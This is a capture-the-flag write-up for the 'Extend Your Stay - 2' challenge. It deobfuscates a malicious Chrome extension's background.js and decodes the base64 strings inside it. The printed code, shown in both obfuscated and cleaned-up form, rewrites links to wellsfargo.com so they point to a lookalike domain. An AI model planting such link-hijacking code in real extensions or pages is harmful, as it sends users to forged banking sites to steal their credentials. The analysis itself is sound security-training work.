# ICS CTF 2024 - Extend Your Stay 2

**Title:** Extend Your Stay - 2
**Description:** Along with protecting internet users from rodents, this extension (same extension as `Extend Your Stay - 1` seems to hijack links to a particular site and redirect them to a forgery with a similar-looking URL controlled by the developers. What is the URL of the site that links get redirected to?  
  
_Flag format: URL. Example: **[http://www.example.com](http://www.example.com/)**_

**File:** [no_more_rodents.crx](https://github.com/xtasy94/CTFW/blob/main/ICS%20CTF%202024/Extend%20Your%20Stay/Files_1_and_2/no_more_rodents.crx)
## Solution:

Looking at the [background.js](https://github.com/xtasy94/CTFW/blob/main/ICS%20CTF%202024/Extend%20Your%20Stay/Files_1_and_2/background.js) file, we see this obfuscated javascript code:
```javascript
    var _0x4808c5=_0x4d65;function _0x4d65(_0x1ac046,_0xdb813f){var _0x42de99=_0x42de();return _0x4d65=function(_0x4d65e4,_0x2bb8e7){_0x4d65e4=_0x4d65e4-0xb3;var _0x3d9dce=_0x42de99[_0x4d65e4];return _0x3d9dce;},_0x4d65(_0x1ac046,_0xdb813f);}(function(_0xad6f15,_0x121327){var _0xc7839f=_0x4d65,_0x5a0ac3=_0xad6f15();while(!![]){try{var _0x8cad1a=-parseInt(_0xc7839f(0xbc))/0x1*(parseInt(_0xc7839f(0xba))/0x2)+-parseInt(_0xc7839f(0xb6))/0x3*(parseInt(_0xc7839f(0xb9))/0x4)+-parseInt(_0xc7839f(0xb7))/0x5+parseInt(_0xc7839f(0xb5))/0x6+parseInt(_0xc7839f(0xbb))/0x7*(parseInt(_0xc7839f(0xb8))/0x8)+parseInt(_0xc7839f(0xb4))/0x9*(-parseInt(_0xc7839f(0xbe))/0xa)+parseInt(_0xc7839f(0xc0))/0xb*(parseInt(_0xc7839f(0xb3))/0xc);if(_0x8cad1a===_0x121327)break;else _0x5a0ac3['push'](_0x5a0ac3['shift']());}catch(_0x1ba48e){_0x5a0ac3['push'](_0x5a0ac3['shift']());}}}(_0x42de,0x583a6));function _0x42de(){var _0x2b65ad=['href','8856cNMCoO','32787TKstXc','540444COUjiw','1317BdQCgn','2249910WgEroQ','7640EMFxQu','3124SVgnKu','2XPDNHL','3073UIRrAf','628931indBOZ','length','10AaewyR','includes','19041ygvqPQ'];_0x42de=function(){return _0x2b65ad;};return _0x42de();}var rodents=document['getElementsByTagName']('a');for(var i=0x0;i<rodents[_0x4808c5(0xbd)];i++){rodents[i][_0x4808c5(0xc1)][_0x4808c5(0xbf)](atob('aHR0cHM6Ly93d3cud2VsbHNmYXJnby5jb20v'))&&(rodents[i][_0x4808c5(0xc1)]=atob('aHR0cHM6Ly93d3cuZmVsbHN3YXJnby5jb20v'));}
```

I used an online deobfuscator called [deobfuscate.io](https://obf-io.deobfuscate.io/) to deobfuscate it, and this is the output we get:

```javascript
var _0x4808c5 = _0x4d65;
function _0x4d65(_0x1ac046, _0xdb813f) {
  var _0x42de99 = _0x42de();
  _0x4d65 = function (_0x4d65e4, _0x2bb8e7) {
    _0x4d65e4 = _0x4d65e4 - 0xb3;
    var _0x3d9dce = _0x42de99[_0x4d65e4];
    return _0x3d9dce;
  };
  return _0x4d65(_0x1ac046, _0xdb813f);
}
(function (_0xad6f15, _0x121327) {
  var _0xc7839f = _0x4d65;
  var _0x5a0ac3 = _0xad6f15();
  while (true) {
    try {
      var _0x8cad1a = -parseInt(_0xc7839f(0xbc)) / 0x1 * (parseInt(_0xc7839f(0xba)) / 0x2) + -parseInt(_0xc7839f(0xb6)) / 0x3 * (parseInt(_0xc7839f(0xb9)) / 0x4) + -parseInt(_0xc7839f(0xb7)) / 0x5 + parseInt(_0xc7839f(0xb5)) / 0x6 + parseInt(_0xc7839f(0xbb)) / 0x7 * (parseInt(_0xc7839f(0xb8)) / 0x8) + parseInt(_0xc7839f(0xb4)) / 0x9 * (-parseInt(_0xc7839f(0xbe)) / 0xa) + parseInt(_0xc7839f(0xc0)) / 0xb * (parseInt(_0xc7839f(0xb3)) / 0xc);
      if (_0x8cad1a === _0x121327) {
        break;
      } else {
        _0x5a0ac3.push(_0x5a0ac3.shift());
      }
    } catch (_0x1ba48e) {
      _0x5a0ac3.push(_0x5a0ac3.shift());
    }
  }
})(_0x42de, 0x583a6);
function _0x42de() {
  var _0x2b65ad = ['href', '8856cNMCoO', '32787TKstXc', '540444COUjiw', '1317BdQCgn', '2249910WgEroQ', '7640EMFxQu', '3124SVgnKu', '2XPDNHL', '3073UIRrAf', '628931indBOZ', 'length', '10AaewyR', 'includes', '19041ygvqPQ'];
  _0x42de = function () {
    return _0x2b65ad;
  };
  return _0x42de();
}
var rodents = document.getElementsByTagName('a');
for (var i = 0x0; i < rodents[_0x4808c5(0xbd)]; i++) {
  if (rodents[i][_0x4808c5(0xc1)][_0x4808c5(0xbf)](atob('aHR0cHM6Ly93d3cud2VsbHNmYXJnby5jb20v'))) {
    rodents[i][_0x4808c5(0xc1)] = atob('aHR0cHM6Ly93d3cuZmVsbHN3YXJnby5jb20v');
  }
}
```

Straight up we see two base64 strings: `aHR0cHM6Ly93d3cud2VsbHNmYXJnby5jb20v` and `aHR0cHM6Ly93d3cuZmVsbHN3YXJnby5jb20v`, 

In plain terms, this code is checking if a property of each `rodents` array item contains the URL `"aHR0cHM6Ly93d3cud2VsbHNmYXJnby5jb20v"`. If it does, it replaces that URL with `"aHR0cHM6Ly93d3cuZmVsbHN3YXJnby5jb20v"`, decoding these, we get:

```bash
$ echo "aHR0cHM6Ly93d3cud2VsbHNmYXJnby5jb20v" | base64 -d
https://www.wellsfargo.com/
```
and
```bash
$ echo "aHR0cHM6Ly93d3cuZmVsbHN3YXJnby5jb20v" | base64 -d
https://www.fellswargo.com/
```

And that's our flag: `https://www.fellswargo.com`

